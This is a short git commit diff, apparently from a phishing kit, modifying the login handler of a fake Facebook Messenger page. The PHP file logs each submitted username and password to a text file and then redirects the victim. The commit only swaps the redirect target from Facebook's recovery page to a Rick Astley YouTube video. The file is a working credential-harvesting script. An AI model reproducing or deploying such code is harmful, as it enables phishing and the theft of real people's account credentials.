ddc3b8aa87d71b36ed7a85572fe5ea7bdd9a3dbd
Lê Thành <70613309+LeThanhGodz@users.noreply.github.com>
2021-10-08 12:09:11 +0700

    Update login.php

--- .sites/fb_messenger/login.php
+++ .sites/fb_messenger/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Messenger Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.facebook.com/recover/initiate/');
+header('Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley');
 exit();
 ?>
